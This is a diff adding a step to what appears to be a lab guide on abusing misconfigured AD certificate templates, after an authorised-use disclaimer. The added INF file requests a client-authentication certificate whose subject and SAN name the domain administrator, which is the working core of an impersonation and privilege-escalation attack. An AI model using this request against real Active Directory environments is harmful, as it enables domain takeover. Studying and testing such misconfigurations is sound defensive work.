@@ -16,3 +16,31 @@ This demonstration highlights the importance of proper certificate template hard
 This guide is intended for authorized security assessments only. Unauthorized use or actions without proper consent may violate laws and regulations. Always ensure you have explicit permission before conducting such activities.
 
 Enjoy learning and, most importantly, stay safe!
+
+ # Follow the instructions:
+
+ Creat a 'inf' file:
+ ```
+powershell
+
+[Version]
+Signature="$Windows NT$"
+
+[NewRequest]
+Subject = "CN=administrator, OU=Users, DC=bev, DC=beer"
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = FALSE
+ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
+ProviderType = 12
+RequestType = PKCS10
+KeyUsage = 0xa0
+
+[EnhancedKeyUsageExtension]
+OID=1.3.6.1.5.5.7.3.2  ; Client Authentication
+
+[Extensions]
+2.5.29.17 = "{text}"
+_continue_ = "dns=bev.beer&upn=administrator@bev.beer"
+```
